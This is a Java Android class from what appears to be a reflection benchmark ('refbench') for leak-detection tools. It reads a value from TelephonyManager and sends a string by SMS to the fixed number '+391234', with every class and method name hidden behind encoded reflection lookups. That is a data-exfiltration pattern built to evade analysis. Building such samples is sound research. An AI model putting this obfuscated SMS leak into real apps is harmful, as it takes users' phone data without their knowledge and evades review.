package disi.unitn.refbench.refbench12;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


import android.app.PendingIntent;
import android.content.Context;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;


public class BaseClass {
    String str;
    String TAG = "BaseClass";
    TelephonyManager tm;
    EncodeDecode ed;
    SmsManager sms;

    public BaseClass() {
        Log.i(TAG, "This is a default constructor!");

    }

    public void Initiate(Context context) throws IOException{
        tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        sms = SmsManager.getDefault();
        ed = new EncodeDecode();
    }

    public void method1(){

        try {
            Class<?> mClass;
            Method m;
            mClass = Class.forName(ed.decode("c1"));
            m = mClass.getMethod(ed.decode("m1"));
            str = (String)m.invoke(tm, new Object[]{});
        } catch (ClassNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }

    }

    public void method2(String s){

        try {
            Class<?> mClass;
            Method m;
            mClass = Class.forName(ed.decode("c2"));
            m = mClass.getMethod(ed.decode("m2"), String.class, String.class, String.class, PendingIntent.class, PendingIntent.class);
            m.invoke(sms, new Object[]{"+391234", null, s, null, null});

        } catch (ClassNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
